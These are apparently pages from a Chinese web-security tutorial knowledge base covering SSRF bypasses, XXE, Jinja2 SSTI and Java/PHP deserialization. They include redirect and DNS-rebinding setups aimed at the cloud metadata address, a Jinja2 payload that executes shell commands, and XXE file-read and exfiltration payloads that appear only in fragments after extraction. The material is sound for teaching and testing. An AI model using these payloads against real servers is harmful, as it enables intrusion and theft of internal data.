然后可以用python3来执行，但是在使用oct()转八进制的时候，有0o标记，这种的在访问时浏览器识别不了： 修正过后的代码如下： #!/usr/bin/env python # -*- coding:utf-8 -*- import random import re from argparse import ArgumentParser from IPy import IP __version__ = '0.1.0' def get_args(): parser = ArgumentParser() parser.add_argument('ip', help='The IP to perform IPFuscation on') parser.add_argument('-o', '--output', help='Output file') return parser.parse_args() def banner(): print(\"IPFuscator\") print(\"Author: Vincent Yiu (@vysecurity)\") print(\"https://www.github.com/vysec/IPFuscator\") print(\"Version: {}\".format(__version__)) print(\"\") def checkIP(ip): m = re.match('\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\Z', ip) if m: # Valid IP format parts = ip.split('.') if len(parts) == 4: # Valid IP for i in parts: if int(i) > 255 or int(i) 也可以使用IPy模块进行转换： import IPy #IPv4与十进制互转 IPy.IP('127.0.0.1').int() IPy.IP('3689901706').strNormal() #16进制转换 IPy.IP('127.0.0.1').strHex() #IPv4/6转换 IPy.IP('127.0.0.1').v46map() 本地环回地址 127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加[]): http://127.0.0.1 http://localhost http://127.255.255.254 127.0.0.1 - 127.255.255.254 http://[::1] http://[::ffff:7f00:1] http://[::ffff:127.0.0.1] http://127.1 http://127.0.1 http://0:80 punycode转码 IDN（英语：Internationalized Domain Name，缩写：IDN）即为国际化域名，又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。包括法语、阿拉伯语、中文、斯拉夫语、泰米尔语、希伯来语或拉丁字母等非英文字母，这些文字经多字节万国码编译而成。在域名系统中，国际化域名使用Punycode转写并以美国信息交换标准代码（ASCII）字符串储存。punycode是一种表示Unicode码和ASCII码的有限的字符集，可对IDNs进行punycode转码，转码后的punycode就由26个字母+10个数字，还有“-”组成。 使用在线的编码工具测试： 对正常的字母数字组成的域名，也可以使用punycode编码格式，即： www.qq.com => www.xn--qq-.com 一些浏览器对正常的域名不会使用punycode解码，如Chrome，所以在Chrome中访问失败，测试了部分PHP中的函数，也会失败： 同形异义字攻击（IDN_homograph_attack，IDN欺骗） 同形异义字指的是形状相似但是含义不同，这样的字符如希腊、斯拉夫、亚美尼亚字母，部分字符看起来和英文字母一模一样： 如果使用这些字符注册域名，很容易进行欺骗攻击(点击查看详情)，所以就出现了punycode转码，用来将含义特殊字符的域名编码为IDN，目前谷歌浏览器、Safari等浏览器会将存在多种语言的域名进行Punycode编码显示。 封闭式字母数字 (Enclosed Alphanumerics)字符 封闭式字母数字是一个由字母数字组成的Unicode印刷符号块，使用这些符号块替换域名中的字母也可以被浏览器接受。目前的浏览器测试只有下列单圆圈的字符可用： ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ 浏览器访问时会自动识别成拉丁英文字符 Redirect 可以使用重定向来让服务器访问目标地址，可用于重定向的HTTP状态码：300、301、302、303、305、307、308。在github项目SSRF-Testing上可以看到已经配置好的用例： https:./.localdomain.pw/img-without-body/301-http-www.qq.com-.i.jpg https:./.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg https:./.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json 服务端PHP代码如下： DNS解析 配置域名的DNS解析到目标地址(A、cname等)，这里有几个配置解析到任意的地址的域名： nslookup 127.0.0.1.nip.io nslookup owasp.org.127.0.0.1.nip.io DNS 重绑定 如果某后端代码要发起外部请求，但是不允许对内部IP进行请求，就要对解析的IP进行安全限制，整个流程中首先是要请求一次域名对解析的IP进行检测，检测通过交给后面的函数发起请求。如果在第一次请求时返回公网IP,第二次请求时返回内网IP，就可以达到攻击效果。要使得两次请求返回不同IP需要对DNS缓存进行控制，要设置DNS TTL为0，测试cloudflare并不行： 那么还可以自定义DNS服务器，这样就能方便控制每次解析的IP地址了，使用SSRF-Testing项目中的dns.py脚本执行 python3 dns.py 216.58.214.206 169.254.169.254 127.0.0.1 53 localdomains.pw 在本地53端口开启DNS服务，为localdomains.pw指定两次解析IP，第一次是216.x，第二次是169.x。开启后使用 nslookup 1111.localdomains.pw 127.0.0.1 指定DNS服务器为127.0.0.1，查询解析记录： 这样一来，两次解析的IP就能方便的控制了。 点分割符号替换 在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用。｡．来代替： http://www。qq。com http://www｡qq｡com http://www．qq．com 短地址绕过 这个是利用互联网上一些网站提供的网址缩短服务进行一些黑名单绕过，其原理也是利用重定向： URL十六进制编码 URL十六进制编码可被浏览器正常识别，编码脚本： data = \"www.qq.com\"; alist = [] for x in data: alist.append(hex(ord(x)).replace('0x', '%')) print(f'http://{\"\".join(alist)}') Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 11:32:09 "},"知识库/01.WEB安全/07.XXE/":{"url":"知识库/01.WEB安全/07.XXE/","title":"07.XXE","keywords":"","body":"简介 XXE（XML External Entity Injection）全称XML外部实体注入漏洞，既然是注入，说明也是执行了我们的恶意代码。 它产生的原因是：应用程序在解析XML内容时，没有禁止外部实体的加载，导致可加载恶意外部文件；因此如果XML内容可控，那么就可造成 文件读取 命令执行（难） 内网端口扫描 攻击内网网站 发起dos攻击等危害。 XML基础 既然漏洞是由于解析XML引起的，那么不了解一下XML怎么行呢？ XML和HTML长得有点类似，都是基于标签的格式，但是HTML被设计用来显示数据，XML则被设计用来传输和存储数据 XML语法 XML 声明文件的可选部分，如果存在需要放在文档的第一行 XML 必须包含根元素，它是所有其他元素的父元素，比如下面的userInfo元素 aaron 18 所有的 XML 元素都必须有一个关闭标签 paragraph 不能省略 --> XML 标签对大小写敏感。标签 与标签 是不同的，必须使用相同的大小写来编写打开标签和关闭标签 所有元素都必须彼此正确地嵌套 This text is bold and italic This text is bold and italic 属性都必须添加双引号，这点和HTML类似 aa XML注释和HTML一样 XML DTD DTD简介 XML DTD(Document Type Definition)文档类型定义的作用是定义 XML 文档的合法构建模块，它使用一系列合法的元素来定义文档的结构。 内部DOCTYPE声明 ]> d4m1ts 18 以上 DTD 解释如下： !DOCTYPE userInfo (第二行)定义此文档是 userInfo 类型的文档。 !ELEMENT userInfo (第三行)定义 userInfo 元素有两个元素：\"name、age\" !ELEMENT name (第四行)定义 name 元素为 \"#PCDATA\" 类型 PCDATA 是会被解析器解析的文本，这些文本将被解析器检查实体以及标记，文本中的标签会被当作标记来处理，而实体会被展开 CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。 外部DOCTYPE声明 Tove Jani Reminder Don't forget me this weekend! 在XML中，有5个预定义的实体引用，这是为了防止在解析的时候，给我们输入的当成标签来处理，导致异常 实体引用 字符 &lt; &gt; > &amp; & &quot; \" &apos; ' 举例 if salary &lt; 1000 then DTD实体 实体是用于定义引用普通文本或特殊字符的快捷方式的**变量**。 一个内部实体声明 ]> &name; 18 一个外部实体声明 漏洞环境搭建 服务器解析XML出现问题，那漏洞环境就写一个可以解析XML内容的代码即可。这里我用Java中的SAXReader这个类的read()方法来触发 依赖 org.dom4j dom4j 2.1.1 漏洞代码 import org.dom4j.Document; import org.dom4j.DocumentException; import org.dom4j.Element; import org.dom4j.io.SAXReader; import java.io.File; public class Main { public static void main(String[] args) throws DocumentException { SAXReader saxReader = new SAXReader(); Document document = saxReader.read(new File(\"src/main/resources/test.xml\")); Element rootElement = document.getRootElement(); System.out.println(rootElement.element(\"name\").getData()); } } test.xml ]> &name; 后续只需要修改test.xml中的内容即可 XXE基础利用 在上面加载外部实体声明的时候，可以注意到它的语法 可以从一个URL加载DTD，当然按照非正常的思维，允许输入URL也就相当于允许输入其他类似http的协议的链接，比如file、ftp这些，那这里岂不是至少就可能存在2个漏洞了 SSRF 任意文件读取 各语言支持的协议如下： LIBXML2 PHP JAVA .NET file file http file http http https http ftp ftp ftp https php file ftp compress.zlib jar compress.bzip2 netdoc data mailto glob gopher * phar 这里只介绍基础的带回显的利用方法，不带回显的可以参考下面的Payload 读取文件 读取/etc/passwd，这个明显是给file///etc/passwd的值赋值给name ]> &name; SSRF 简单的发起http请求，根据结果具体情况具体分析 ]> &name; 执行系统命令 比较鸡肋，比较难利用，要在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能吧 ]> &xxe; 拒绝服务攻击 递归引用，lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。 ]> &lol9; XInclude攻击 一些情况下，我们可能无法控制整个XML文档，也就无法完全XXE，但是我们可以控制其中一部分，这个时候就可以使用XInclude XInclude是XML规范的一部分，它允许从子文档构建XML文档。可以在XML文档中的任何数据值中放置XInclude Payload 要执行XInclude攻击，需要引用XInclude命名空间并提供要包含的文件的路径。例如： 哪些地方可能存在XXE 允许上传XML文件的地方 允许上传Excel、Word、SVG等文件的地方（因为这些文件本质也是XML） 请求中Content-Type允许为application/xml的数据包(可以手动修改，比如将application/json中的json直接修改为xml) ... 总而言之一句话：所有能传能解析XML数据给服务端的地方，都可能存在XXE。 防御 1、使用开发语言提供的禁用外部实体的方法 不同的类可能设置方法也不一样，具体情况具体分析。 php: libxml_disable_entity_loader(true); java: SAXReader saxReader = new SAXReader(); saxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); Python: from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 2、过滤用户提交的XML数据 过滤关键字：和，或者SYSTEM和PUBLIC。 3、不允许XML中含有自己定义的DTD Payload Basic Basic XML Example John Doe Entity Example ]> John &example; Inband Injection Extract data from the server ]> &file; ]>&xxe; ]>&xxe; XXE Base64 encoded %init; ]> PHP Wrapper inside XXE ]> Jean &xxe; Dupont 00 11 22 33 44 42 rue du CTF 75000 Paris ]> &xxe; OOB Injection Vanilla, used to verify outbound xxe or blind xxe ]> &sp; OOB extraction1 %sp; %param1; ]> &exfil; 外部实体 \"> OOB variation of above (seems to work better against .NET) %sp; %param1; %exfil; ]> 外部实体 \"> OOB extraction2 %sp; %param3; %exfil; ]> External dtd \"> OOB extra ERROR -- Java %sp; %param3; %exfil; ]> External dtd '> %param1; %external; OoB XXE Base64 -- PHP %remote;%int;%send; ]> \"> OOB extra nice \"> %dtd; ]> &all; External dtd File-not-found exception based extraction %one; %two; %four; ]> External dtd \"> FTP %asd; %c; ]> &rrr; External dtd \"> Inside SOAP body %dtd;]>]]> XXE inside SVG Untested - WAF Bypass DOS 包括一个随机的文件 ]> Billion Laugh Attack - Denial Of Service &lol9; 参考文章 从XML相关一步一步到XXE漏洞 xxe XML External Entity (XXE) Injection Payload List XXE_payloads Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:48:30 "},"知识库/01.WEB安全/08.SSTI/":{"url":"知识库/01.WEB安全/08.SSTI/","title":"08.SSTI","keywords":"","body":"定义 SSTi(Server Side Template Injection)，服务端模板注入，它主要利用的是模板引擎将攻击者构造的payload在服务端按代码语义解析执行，然后加载在模板文件中(可以是HTML，也可以是模板可解析的特定后缀)，最后渲染到web页面上。 一些知识点 什么是模板/模板引擎？ 目前主流的web开发主要分为以下两种技术： 前后端不分离：即后端完成路由，用户在浏览器输入一个url，访问的是后端路由（服务端响应），后端接收请求后，再将数据通过模板引擎解析再渲染成视图返回给前端。后端路由，由后端渲染数据，再返回视图给前端，前端只负责展示视图，所有的交互都在后台 前后端分离：前端使用JavaScript框架，如(jquery，vue，react，angular)，前端项目化；后端去掉所有的视图，只提供api接口，用户在浏览器访问的路由为前端路由（也称为Hash路由，由前端响应），只加载前端视图，数据只通过ajax获取，前端获取数据之后再渲染到视图，前端负责控制路由，展示视图，后端只负责提供api，用户和视图交互，视图上的按钮以及页面数据和后端api交互 模板可以理解为一段固定好格式，等着你来填充信息的文件。通过这种方法，可以做到逻辑与视图分离，更容易、清楚且相对安全地编写前后端不同的逻辑。作为对比，一个很不好的解决方法是用脚本语言的字符串拼接html，然后统一输出。 模板引擎是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的文档，就是将模板文件和数据通过模板引擎生成一个HTML代码。 流程如下所示： 视图(view)： {{title}} This page took {{microtime(true) - time}} seconds to render. 后端逻辑(Controller)：后端将数据绑定绑定好交给模板引擎解析，完成前端页面的渲染 $templateEngine = new TemplateEngine(); $tpl = $templateEngine->loadFile(login.tpl); $tpl->assign('title','Login'); $tpl->assign('method','post'); $tpl->assign('action','login.php'); $tpl->assign('username',getUserNameFromCookie()); $tpl->assign('time',microtime(true)); $tmp->show(); 模板注入基本原理 通过模板，Web应用可以把输入经过模板解析转换成特定字符显示在HTML文件,这里以一个简单的例子来说明，如下，将客户端传来的name经过模板解析，然后将渲染好的值返回给前端 靶场环境 这里选择python3 + flask + jinja2 作为靶场环境 from flask import Flask, request from jinja2 import Template app = Flask(__name__) @app.route('/') def index(): name = request.args.get('name', 'guest') t = Template(\"Hello \" + name) return t.render() if __name__ == \"__main__\": app.run() 正常请求如下，服务端解析字符之后，就和前面的Hello拼接起来，然后呈现给前端 那么如果利用模板语法呢？（这里只针对jinja2做测试） {{7*7}} 我们可以调试看一下，在调用gensrate 之前，source在经过上一层parse函数解析之后，已经将需要渲染的内容变成了Template(body=[Output(nodes=[TemplateData(data='Hello '), Mul(left=Const(value=7), right=Const(value=7))])]) 继续单步向下，可以看到模板引擎已经将其解析成代码了 这个调试有点复杂，在生成代码之后，然后再代码执行（代码执行的函数为from_code） 那么只需要根据模板语法来构造payload就可以完成代码执行了，但是也并不是任意代码执行的,需要满足引擎渲染的表达式，来构造代码 模板用法 {{ ... }}：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。 {% ... %}：装载一个控制语句。 {# ... #}：装载一个注释，模板渲染的时候会忽视这中间的值 变量 在模板中添加变量，可以使用（set）语句 {% set name='xx' %} 创建一个内部的作用域 with语句来创建一个内部的作用域，将set语句放在其中，这样创建的变量只在with代码块中才有效 {% with gg = 42 %} {{ gg }} {% endwith %} if 语句 {% if 1==1 %} {{ 7*7 }} {%else%} {{ 8*8 }} {% endif %} for 循环 {% for c in ['1','2','3'] %} {{c}} {%endfor%} 利用方法 Flask使用Jinja2这个渲染引擎，结合python代码来看，主要是通过Python对象的继承，用魔术方法一步步找到可利用的方法去执行。即找到父类–>寻找子类–>找关于命令执行或者文件操作的模块 对象的魔术方法 __class__ 返回示例所属的类 __mro__ 返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。 __base__ 返回一个类所继承的基类 # __base__和__mro__都是用来寻找基类的 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用列表 __init__ 类的初始化方法 __globals__ 对包含函数全局变量的字典的引用 payload %7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D paylaod 分析 使用for表达式来获取eval函数(只针对flask)，使用eval函数加载恶意执行代码 for c in [].__class__.__base__.__subclasses__(): if c.__name__ == 'catch_warnings': for b in c.__init__.__globals__.values(): if b.__class__ == {}.__class__: if 'eval' in b.keys(): print(b['eval']('__import__(\"os\").popen(\"id\").read()')) 以上代码改写为模板语法如下：满足模板语法，通过寻找list的基类中可用的引用列表，当其满足是字典的时候，存在eval方法，直接执行代码 {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(\"os\").popen(\"id\").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} 其他环境 环境地址 备注 https://vulhub.org/#/environments/flask/ssti/ vulhub https://portswigger.net/web-security/all-labs burp官方靶场 参考链接 https://blog.csdn.net/qq_43431158/article/details/105322894 https://blog.csdn.net/u011377996/article/details/86776181 https://portswigger.net/web-security/server-side-template-injection https://vulhub.org/#/environments/flask/ssti/ https://blog.csdn.net/new_abc/article/details/48091721 https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:48:51 "},"知识库/01.WEB安全/09.反序列化/Java序列化与反序列化.html":{"url":"知识库/01.WEB安全/09.反序列化/Java序列化与反序列化.html","title":"Java序列化与反序列化","keywords":"","body":"Java 序列化和反序列化 介绍 序列化和反序列化都是在对象的基础上进行的！！！ 必须要 **implements Serializable** 的类才可以序列化和反序列化 什么是序列化和反序列化 java的序列化机制就是为了持久化存储某个对象或者在网络上传输某个对象。我们都知道，一旦jvm关闭，那么java中的对象也就销毁了，所以要想保存它，就需要把他转换为字节序列写到某个文件或是其它哪里。 Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。即序列化是指把一个Java对象变成二进制内容，本质上就是一个byte[]数组。 为什么要把Java对象序列化呢？因为序列化后可以把byte[]保存到文件中，或者把byte[]通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。 将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，即把一个二进制内容（也就是byte[]数组）变回Java对象。有了反序列化，保存到文件中的byte[]数组又可以“变回”Java对象，或者从网络上读取byte[]并把它“变回”Java对象。也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。 整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。 Java的序列化机制仅适用于Java，如果需要与其它语言交换数据，必须使用通用的序列化方法，例如JSON。 序列化要求 一个Java对象要能序列化，必须实现一个特殊的java.io.Serializable接口，它的定义如下： public interface Serializable { } Serializable接口没有定义任何方法，它是一个空接口。我们把这样的空接口称为“标记接口”（Marker Interface），实现了标记接口的类仅仅是给自身贴了个“标记”，并没有增加任何方法。 其他 类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。 ObjectOutputStream 类包含很多写方法来写各种数据类型，但是一个特别的方法例外： public final void writeObject(Object x) throws IOException 上面的方法序列化一个对象，并将它发送到输出流。相似的 ObjectInputStream 类包含如下反序列化一个对象的方法： public final Object readObject() throws IOException, ClassNotFoundException 该方法从流中取出下一个对象，并将对象反序列化。它的返回值为Object，因此，你需要将它转换成合适的数据类型。 序列化步骤 把对象转换为字节序列 步骤一：创建一个ObjectOutputStream输出流； 步骤二：调用ObjectOutputStream对象的writeObject输出可序列化对象。 反序列化步骤 把字节序列转换为对象 步骤一：创建一个ObjectInputStream输入流； 步骤二：调用ObjectInputStream对象的readObject()得到序列化的对象。 代码举例 序列化和反序列化 --> 文件 package org.example; import java.io.*; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 // 创建一个FileOutputStream，且将这个FileOutputStream封装到ObjectOutputStream中 ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"123.ser\")); // 调用writeObject方法，序列化对象到文件123.ser中 objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); // 反序列化 // 创建一个FIleInutputStream，并将FileInputStream封装到ObjectInputStream中 try (ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\"123.ser\"))) { // 调用readObject从123.ser中反序列化出对象，还需要进行一下类型转换，默认是Object类型 SerializeDemo ss = (SerializeDemo) objectInputStream.readObject(); System.out.println(ss.add(1,2)); } } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } 这里要注意以下要点： readObject() 方法中的 try/catch代码块尝试捕获 ClassNotFoundException 异常。对于 JVM 可以反序列化对象，它必须是能够找到字节码的类。如果JVM在反序列化对象的过程中找不到该类，则抛出一个 ClassNotFoundException 异常。 readObject() 方法的返回值被转化成 SerializeDemo引用。 序列化和反序列化 --> bytes数组 package org.example; import java.io.*; import java.util.Arrays; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); // 本体 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); // 只是一个装饰器的作用 Filter模式，懂？ objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); SerializeDemo serializeDemo1 = (SerializeDemo)objectInputStream.readObject(); objectInputStream.close(); serializeDemo1.add(1,2); } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } /* [-84, -19, 0, 5, 115, 114, 0, 25, 111, 114, 103, 46, 101, 120, 97, 109, 112, 108, 101, 46, 83, 101, 114, 105, 97, 108, 105, 122, 101, 68, 101, 109, 111, -89, 103, -99, 60, 6, -29, 97, -91, 2, 0, 1, 73, 0, 1, 120, 120, 112, 0, 0, 2, -102] 669 */ 序列化特征 十六进制查看我们生成的123.ser # hexdump没有xxd直观 xxd 123.ser xxd显示的结果，中间那一栏是文件的十六进制显示，最右边是字符显示。这里需要注意的特征值就是16进制显示时的前32位： AC ED：STREAM_MAGIC，声明使用了序列化协议，从这里可以判断保存的内容是否为序列化数据。 （这是在黑盒挖掘反序列化漏洞很重要的一个点） 00 05：STREAM_VERSION，序列化协议版本。 安全性 因为Java的序列化机制可以导致一个实例能直接从byte[]数组创建，而不经过构造方法，因此，它存在一定的安全隐患。一个精心构造的byte[]数组被反序列化后可以执行特定的Java代码，从而导致严重的安全漏洞。 实际上，Java本身提供的基于对象的序列化和反序列化机制既存在安全性问题，也存在兼容性问题。更好的序列化方法是通过JSON这样的通用数据结构来实现，只输出基本类型（包括String）的内容，而不存储任何与代码相关的信息。 反序列化漏洞的攻击流程 客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码） exp发送到服务端，进入一个服务端自主重写（也可能是也有组件重写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层） 这个恶意数据exp_1在接下来的处理流程(可能是在自主重写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3...... 最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。 那么以上大概可以分成三个主要部分： payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等； 反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(如commons-collections利用链) 重写readObject：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数重写点 漏洞挖掘 java是支持自定义readObject与writeObject方法的，只要某个类中按照特定的要求实现了readObject方法，那么在反序列化的时候就会自动调用它，如果这个自定义的readObject方法里进行了一些危险操作，那么就会导致反序列化漏洞的发生了。 举例如下： 可以看到自定义的readObject的确执行了，不过真实的应用中危险操作比较隐蔽。 需要注意的是，实现 readObject/writeObject 方法一定需要private 私有化，否则会找不到自定义的方法，从而使用ObjectOutputStream中的readObject方法 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:49:36 "},"知识库/01.WEB安全/09.反序列化/PHP反序列化.html":{"url":"知识库/01.WEB安全/09.反序列化/PHP反序列化.html","title":"PHP反序列化","keywords":"","body":"简介 php反序列化基本上是围绕着serialize()，unserialize()两个函数展开的，还有PHAR协议用于解析phar文件，phar文件的meta-data字段存在反序列化漏洞，可以使用协议读取文件触发反序列化。那么什么是序列化呢？序列化就是将一个对象变成可以传输的字符串，而反序列化其实就是将序列化得到的字符串再转变成对象。 首先上例子： 我们先讲简单的json序列化/反序列化，json格式就是一种序列化，虽然序列化json和php的反序列化漏洞无直接的联系，但是在理解反序列化这个概念会有所帮助 json_encode() json_decode() 'test_1','book_2' => 'test_2','book_3' => 'test_3', 'book_4' => 'test_4'); $json = json_encode($book); echo $json; ?> 在这里我们有一个book数组，如果需要传输这个数组，我们可以利用json_encode()函数将这个数据序列化成一串字符串，以key-value的形式展示出来 'book_1' => 'test_1', 'book_2' => 'test_2', 'book_3' => 'test_3', 'book_4' => 'test_4' 所以我们将数组序列化成json格式的字符串的目的就是为了方便传输，我们可以看见，这里json格式来保存数据主要是使用键值对格式来保存的。 json格式只是为了传输数据而出现的，那么我们讲反序列化漏洞的话，就需要将字符串反序列化成对象。 概念 在这里我写一个class，在这个class中存有一些变量，当这个class被实例化之后，在使用过程中，里面的一些变量发生了改变，当如果以后某些时候还会用到这个变量，如果我们让这个class一直不销毁，就会浪费系统资源。如果我们将这个对象序列化，将其保存成一个字符串，当你需要使用的时候，再将其反序列化为对象就可以了。 name = \"aaron\"; $example->sex = \"woman\"; $example->age = 22; echo serialize($example); ?> 在这里，我们首先创建了一个DemoClass，里面存了一些数据，然后我们实例化了一个对象，并将这个对象里的信息改变了，当我们还需要使用这个实例的话，就将序列化（serialize）后的字符串存起来，需要使用的时候再反序列化（unserialize）出来就可以了 我们可以看一下结果 这个时候，序列化对象出来的格式和json格式不一样 O:9:\"DemoClass\":3:{s:4:\"name\";s:5:\"aaron\";s:3:\"sex\";s:5:\"woman\";s:3:\"age\";i:22;} // O 表示 object，这里还有一个情况是A，A表示是Array表示数组 // O:9 这个9 表示对象名表示占9个字符 // O:9:\"DemoClass\":3 这个3 表示是对象里有三个变量 // {s:4:\"name\";s:5:\"aaron\";} s=> 表示String 类型格式，s:4 4=>表示变量名占4位(name)，s:5表示name的值(aaron)是String类型格式，且占5位 // i => 表示是int类型格式，后面直接跟数据 // d => 表示double类型格式 然后如果反序列化（unserialize）回来 name = \"aaron\"; $example->sex = \"woman\"; $example->age = 21; $val = serialize($example); $x = unserialize($val); echo $x->name; ?> 原理 php里的魔术方法，通常因为某些条件而触发，不需要手动调用，我理解的是钩子函数吧，也就是生命周期的概念。 魔术方法 __construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __toString() //当一个对象被当作一个字符串使用 __sleep() //在对象在被序列化之前运行 __wakeup //在对象被反序列化时被调用 理解这几个魔术函数，如果php接收我们反序列化的字符串，且在魔术方法中能够直接执行我们构造的payload，就会造成反序列化漏洞 看一个简单的例子： test; } } $a = $_GET['test']; $a_unser = unserialize($a); ?> 这里表示是我们传入test参数，然后在反序列化成对象，然后在其生命周期当这个反序列化生成的对象要被销毁的时候调用echo 方法，输出test参数 那么我们构造如下payload O:1:\"A\":1:{s:4:\"test\";s:11:\"hello,world\";} test参数可控的情况下，就会输出hello,world 我们在来尝试不同的生命周期 __construtor 在这里，construct是处于创建对象的生命周期中，当创建对象的时候会调用该函数，这里要被利用的话，需要配合另一个Class，这里先用__wakeup在被反序列化时，new一个新的对象A，并传入参数，这里表示test参数可控的情况下，当test参数可控，并在反序列化后，将test参数传入A的新实例中，那么只要constructor中存在可执行代码或者执行命令的函数，那么造成影响 \"; echo $test; } } class B{ public $test_1 = \"\"; function __wakeup(){ $obj = new A($this->test_1); } } $a = $_GET['test']; echo $a; $a_unser = unserialize($a); new A(\"123\"); ?> O:1:\"B\":1:{s:6:\"test_1\";s:11:\"hello,world\";} __destruct 在这里，destruct处于对象被销毁的生命周期，当实例化之后，当对该对象的操作完成之后，那么php的回收机制则会回收该对象，这里就会调用该钩子函数，这里表示test参数可控的情况下，并在反序列化后之后，再打印该值，那么只要destruct中存在可执行代码或者执行命令的函数，那么就会造成影响 \"; echo $this->test; } } $a = $_GET['test']; echo $a; $a_unser = unserialize($a); ?> O:1:\"A\":1:{s:4:\"test\";s:11:\"hello,world\";} __toString 在这里，toString处于当需要将对象输出的生命周期，当反序列化之后，需要输出对象并将其值用作上下文中使用，那么将对调用该钩子函数，当$test参数可控的情况下，在反序列化之后形成对象时，如果需要输出该对象，那么只要toString方法中存在可执行代码或者命令的函数，那么就会造成影响 